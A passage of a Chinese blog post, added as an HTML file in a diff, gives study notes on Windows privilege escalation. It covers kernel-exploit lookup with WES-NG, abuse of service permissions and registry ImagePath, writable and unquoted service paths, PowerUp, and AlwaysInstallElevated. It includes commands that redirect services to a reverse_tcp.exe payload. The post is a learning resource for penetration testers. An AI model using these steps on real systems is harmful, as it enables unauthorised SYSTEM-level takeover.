@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html 
+	lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> 内网渗透体系建设-权限提升 -  clown</title>
+		<link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" />
+		<script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
+		<!-- lazyload -->
+		<script src="https://unpkg.com/lazysizes@5.1.0/lazysizes.min.js"></script>
+		<!-- smooth-scrolling -->
+		<script src="https://unpkg.com/smooth-scrolling.js@1.0.0"></script>
+		<!-- highlight -->
+		<link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark.min.css" />
+		<script src="//unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+			
+				
+<link rel="stylesheet" href="/style.css">
+
+			
+				
+<link rel="stylesheet" href="/custom.css">
+
+			
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="clown">
+        <img
+			src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			alt="clown"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" title="clown">
+			<img
+				src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+				alt="clown"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>23</div>
+		<div><span>标签</span>13</div>
+		<div><span>分类</span>13</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1056317718&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/378722283"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/clowsman"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/ljc0033"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+  <div class="kira-widget-wrap">
+    <h3 class="kira-widget-title">分类</h3>
+    <div class="kira-widget">
+      <ul class="category-list">
+        
+        
+
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/Web/">
+              Web
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/blog/">
+              blog
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/ctf-web/">
+              ctf web
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/git/">
+              git
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/go/">
+              go
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/web/">
+              web
+            </a>
+            <span class="category-list-count">3</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/内网渗透/">
+              内网渗透
+            </a>
+            <span class="category-list-count">4</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/区块链/">
+              区块链
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础/">
+              基础
+            </a>
+            <span class="category-list-count">4</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础-计网/">
+              基础 计网
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础-计网/">
+              基础,计网
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/提权/">
+              提权
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/环境配置/">
+              环境配置
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+		
+			
+	<div class="kira-widget-wrap">
+		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
+			<a href="/tags/CTF-BC/" style="font-size: 10px;">CTF BC</a> <a href="/tags/CTF-web/" style="font-size: 10px;">CTF web</a> <a href="/tags/CTF-%E5%86%85%E7%BD%91/" style="font-size: 10px;">CTF 内网</a> <a href="/tags/Web-CTF/" style="font-size: 10px;">Web CTF</a> <a href="/tags/c-c-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 10px;">c/c++ 环境配置</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/ctf-%E5%88%B7%E9%A2%98/" style="font-size: 10px;">ctf 刷题</a> <a href="/tags/go/" style="font-size: 10px;">go</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/web-ctf-nodejs/" style="font-size: 10px;">web ctf nodejs</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 15px;">内网渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">学习</a> <a href="/tags/%E8%AE%A1%E7%BD%91/" style="font-size: 20px;">计网</a>
+		</div>
+		
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">clown</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png"
+				data-sizes="auto"
+				alt="内网渗透体系建设-权限提升"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>内网渗透体系建设-权限提升</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2024年03月26日</a>
+			<a><i class="kirafont icon-edit-fill"></i>3.1k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 13 分钟</a>
+		</div>
+		<blockquote>
+<p>权限提升可以分为横向权限提升和垂直权限提升，前者是指同级用户，后者是指低级用户到高级用户。</p>
+</blockquote>
+<h1><span id="xi-tong-nei-he-lou-dong-ti-quan">系统内核漏洞提权</span><a href="#xi-tong-nei-he-lou-dong-ti-quan" class="header-anchor">#</a></h1><p>当目标系统存在该漏洞且没有更新安全补丁时，利用已知的系统内核漏洞进行提权测试人员往往可以获得系统级别的访问权限。</p>
+<h2><span id="cha-zhao-lou-dong">查找漏洞</span><a href="#cha-zhao-lou-dong" class="header-anchor">#</a></h2><p><strong>手动查找</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systeminfo<br></code></pre></td></tr></table></figure>
+
+<p>可以利用该命令查看系统安装的补丁</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326091200716.png" alt="image-20240326091200716" class="lazyload"></p>
+<p>然后可以结合系统版本信息，借助辅助工具寻找可用的提权漏洞。</p>
+<p><strong>借助WES-NG查找可用漏洞</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p>使用方法：</p>
+<ol>
+<li><p>执行下面命令更新漏洞库数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 wes.py --update<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326092255515.png" alt="image-20240326092255515" class="lazyload"></p>
+</li>
+<li><p>在目标主机执行systeminfo命令，并将结果保存到sysinfo.txt中，然后执行下面命令，用WES-NG进行检查</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--impact指定漏洞类型为提权漏洞</span><br></code></pre></td></tr></table></figure>
+
+<p>emmm我的win7systeminfo文件跑出来什么都没有，跑了一下我的win11竟然有cve没绷住</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326160918537.png" alt="image-20240326160918537" class="lazyload"></p>
+<p>执行下面命令查找所有已公开EXP的提权漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326161002020.png" alt="image-20240326161002020" class="lazyload"></p>
+</li>
+</ol>
+<h2><span id="que-ding-bing-li-yong-lou-dong">确定并利用漏洞</span><a href="#que-ding-bing-li-yong-lou-dong" class="header-anchor">#</a></h2><p>确定漏洞之后，就去找利用程序然后上传利用进行提权。</p>
+<h1><span id="xi-tong-fu-wu-ti-quan">系统服务提权</span><a href="#xi-tong-fu-wu-ti-quan" class="header-anchor">#</a></h1><p>通常情况下，用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM 权限启动。应用软件在注册服务时，会在以下路径中创建相应的注册表项,路径如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327103308958.png" alt="image-20240327103308958" class="lazyload"></p>
+<p>其中的ImagePath指向启动系统服务的二进制程序路径</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327103611189.png" alt="image-20240327103611189" class="lazyload"></p>
+<p>如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，这是利用系统服务提权的主要思路。</p>
+<h2><span id="bu-an-quan-de-fu-wu-quan-xian">不安全的服务权限</span><a href="#bu-an-quan-de-fu-wu-quan-xian" class="header-anchor">#</a></h2><p>ACL 定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。Windows 的系统服务正是通过 ACL 来指定用户对其拥有的权限，常见的权限列表如下：</p>
+<table>
+<thead>
+<tr>
+<th>权限</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SERVICE_START</td>
+<td>启动服务的权限</td>
+</tr>
+<tr>
+<td>SERVICE_STOP</td>
+<td>停止服务的权限</td>
+</tr>
+<tr>
+<td>SERVICE_PAUSE_CONTINUE</td>
+<td>暂停&#x2F;继续运行服务的权限</td>
+</tr>
+<tr>
+<td>SERVICE_QUERY_STATUS</td>
+<td>查询服务状态的权限</td>
+</tr>
+<tr>
+<td>SERVICE_QUERY_CONFIG</td>
+<td>查询服务配置的权限</td>
+</tr>
+<tr>
+<td>SERVICE_CHANGE_CONFIG</td>
+<td>更改服务配置的权限</td>
+</tr>
+<tr>
+<td>SERVICE_ALL_ACCESS</td>
+<td>完全控制权限</td>
+</tr>
+</tbody></table>
+<p>如果用户在配置服务时使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限，我们就可以直接修改系统服务启动时的二进制文件路径。</p>
+<blockquote>
+<p>AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限。</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p>
+</blockquote>
+<p>低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限。前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户；后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。默认情况下，这两个组为计算机本地“Users”组的成员。</p>
+<p>执行下面命令枚举”Authenticated Users”组是否具有更改服务配置的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-uwcqv: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br><br>u: 显示所属用户（Owner）信息。<br>w: 显示子对象的权限。<br>c: 显示所选对象的ACL（访问控制列表）信息。<br>q: 静默模式，只显示结果而不显示头部信息。<br>v: 显示详细信息。<br></code></pre></td></tr></table></figure>
+
+<p>我在本机没有找到有更改权限的用户</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327105943719.png" alt="image-20240327105943719" class="lazyload"></p>
+<p>以书上例子在找到权限的情况下应该如何利用：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327112003498.png" alt="image-20240327112003498" class="lazyload"></p>
+<p>可以看到该组对InsproSvc服务具有更改服务配置的权限，然后执行下面的命令，我们就可以将该服务启动时执行的二进制文件替换为我们上传的攻击载荷</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">binpath，指定服务的二进制文件路径，注意“=”后必须有一个空格</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327112213382.png" alt="image-20240327112213382" class="lazyload"></p>
+<p>如果当前用户对该服务拥有SERVICE_STOP和SERVICE_START权限，即我们拥有可以重启服务的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sc stop &lt;service name&gt;<br>sc start &lt;service name&gt;<br></code></pre></td></tr></table></figure>
+
+<h2><span id="fu-wu-zhu-ce-biao-quan-xian-cui-ruo">服务注册表权限脆弱</span><a href="#fu-wu-zhu-ce-biao-quan-xian-cui-ruo" class="header-anchor">#</a></h2><p>Windows 的注册表中存储了每个系统服务的条目，而注册表使用 ACL 来管理用户对其所拥有的访问权限。如果注册表的 ACL配置错误，使得一个低权限用户对服务的注册表拥有写入权限，此时可以通过修改注册表来更改服务配置。例如修改注册表中的ImagePath键。</p>
+<ol>
+<li><p>执行下面命令枚举”Authenticated Users”是否具有服务注册表写入权限的用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-uvwqk: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br>u: 显示所属用户（Owner）信息。<br>v: 显示所选对象的详细信息。<br>w: 深入显示子项的信息（递归检查）。<br>q: 静默模式，只显示结果而不显示头部信息。<br>k: 同意许可证。<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327214529644.png" alt="image-20240327214529644" class="lazyload"></p>
+</li>
+<li><p>该用户组对RegSvc服务的注册表具有完全控制权限，所以我们可以执行下面命令将注册表中的ImagePath键指向我们上传的攻击载荷</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg add HKLM\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/v：指定要添加或修改的注册表值的名称。<br>/t：指定注册表值的类型。在这里是REG_EXPAND_SZ，表示该值包含可扩展的字符串。<br>/d：指定要设置的数据值。<br>/f：在执行命令时强制执行，即不进行提示确认操作。<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>执行下面命令检查当前用户对该服务是否有重启权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327215915634.png" alt="image-20240327215915634" class="lazyload"></p>
+<p>然后我们就可以重启服务进行提权</p>
+</li>
+</ol>
+<h2><span id="fu-wu-lu-jing-quan-xian-ke-kong">服务路径权限可控</span><a href="#fu-wu-lu-jing-quan-xian-ke-kong" class="header-anchor">#</a></h2><p>如果目标主机上用户存在错误配置或操作，使得一个低权限的用户对此服务调用的二进制文件或其所在目录拥有写入权限，那么可以直接将该文件替换成攻击载荷，并随着服务的启动继承系统权限。</p>
+<ol>
+<li><p>执行下面命令查看InsexeSvc这个服务的二进制文件所在的目录是否有写入权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula /quv &quot;C:\Program Files\Insecure Executables\&quot; <br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327221559789.png" alt="image-20240327221559789" class="lazyload"></p>
+</li>
+<li><p>结果中看到”INTERACTIVE”组对该文件夹具有完全控制权限、</p>
+<p>该组包含所有能够登录到系统的成员。此时，测试人员可以将InsexeSvc 服务的二进制文件替换成一个同名的攻击载荷，并随着服务的重启继承系统权限</p>
+</li>
+</ol>
+<h2><span id="wei-yin-yong-de-fu-wu-lu-jing">未引用的服务路径</span><a href="#wei-yin-yong-de-fu-wu-lu-jing" class="header-anchor">#</a></h2><p>未引用的服务路径(Unquoted Service Path)漏洞曾被称为可信任的服务路径(TrustedService Path)，利用了 Windows 文件路径解析的特性。当服务启动所执行的二进制文件的路径中包含空格且未有效包含在引号中时，就会导致该漏洞。</p>
+<p>造成该漏洞的根本原因在于 Windows 系统中用于创建进程的 CreateProcess 函数。</p>
+<p>如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格Windows 会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序。例如,对于路径 C:\Program Files\Sub Dir\Program Name.exe,系统依次寻找并执行以下程序C:\Program.exe，C:Program Files\Sub.exe ，C:\Program Files\Sub Dir\Program.exe，C:\Program Files\Sub Dir\Program Name.exe 。</p>
+<blockquote>
+<p>当系统进行该路径尝试的时候，会以当前服务所拥有的权限进行。所以当对受影响的目录具有写入权限时，可以上传一个特殊命名的攻击载荷到该目录中</p>
+</blockquote>
+<ol>
+<li><p>执行下面命令枚举主机上所有有该漏洞的服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327223437698.png" alt="image-20240327223437698" class="lazyload"></p>
+<p>可知UnquoteSvc这个服务的路径有空格且没有引号包裹</p>
+</li>
+<li><p>用Accesschk检查该受影响的目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula  -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Unquoted Path\&quot; <br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327224123522.png" alt="image-20240327224123522" class="lazyload"></p>
+<p>这个时候就可以向该目录上传一个Sub.exe的攻击载荷，检查到这里的时候就会以SYSTEM权限执行Sub.exe程序。</p>
+</li>
+</ol>
+<h2><span id="powerup">PowerUp</span><a href="#powerup" class="header-anchor">#</a></h2><p>powerup就是一个powershell脚本，里面集中了上面所说的所有方法。使用方法可以去看官方文档</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p>
+<p>这里有一篇使用的文章：<a target="_blank" rel="noopener" href="https://blog.51cto.com/binghe001/5247921">https://blog.51cto.com/binghe001/5247921</a></p>
+<h1><span id="msi-an-zhuang-ce-lue-ti-quan">MSI安装策略提权</span><a href="#msi-an-zhuang-ce-lue-ti-quan" class="header-anchor">#</a></h1><p>MSI安装策略提权是由于用户在配置MSI安装策略时，启用了**“永远以高特权进行安装”(AlwaysInstallElevated，默认情况下为禁用状态)**，使得任何权限的用户都可以通过 SYSTEM 权限安装MSI程序。此时测试人员可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM 权限。</p>
+<blockquote>
+<p>MSI（Microsoft Installer）是一种用于 Windows 操作系统的安装包格式，MSI 安装策略指的是针对 MSI 安装程序的一系列安装和配置规则。以下是一些常见的 MSI 安装策略：</p>
+<ol>
+<li><strong>组策略（Group Policy）</strong>：管理员可以使用组策略来指定计算机或用户级别的 MSI 安装策略，例如允许或禁止特定程序的安装、配置安装包位置等。</li>
+<li><strong>静默安装（Silent Installation）</strong>：通过在命令行中使用特定参数，可以实现无需用户干预的 MSI 静默安装。这种安装方式通常用于批量部署软件。</li>
+<li><strong>卸载策略</strong>：管理员可以指定卸载 MSI 软件的策略，包括是否允许用户卸载软件、是否强制卸载等。</li>
+<li><strong>修补策略（Patch Policy）</strong>：允许管理员为已安装的 MSI 软件应用修补程序，以解决漏洞或增加功能。管理员可以规定哪些修补程序允许应用、如何应用修补程序等。</li>
+<li><strong>升级策略（Upgrade Policy）</strong>：管理员可以定义升级策略来升级已安装的软件版本，以确保网络上的计算机都在运行最新版本。</li>
+<li><strong>限制策略（Restriction Policy）</strong>：可以通过策略限制哪些用户或计算机可以安装某个 MSI 软件，从而控制软件的分发和访问权限。</li>
+</ol>
+<p>MSI实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和程序数据</p>
+</blockquote>
+<h2><span id="que-ding-xi-tong-shi-fou-cun-zai-lou-dong">确定系统是否存在漏洞</span><a href="#que-ding-xi-tong-shi-fou-cun-zai-lou-dong" class="header-anchor">#</a></h2><p>如果用户配置了”永远以高特权进行安装”，会在注册表下面两个位置创建键值1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br></code></pre></td></tr></table></figure>
+
+<p>可以执行下面的命令进行确认是否开启该特权</p>
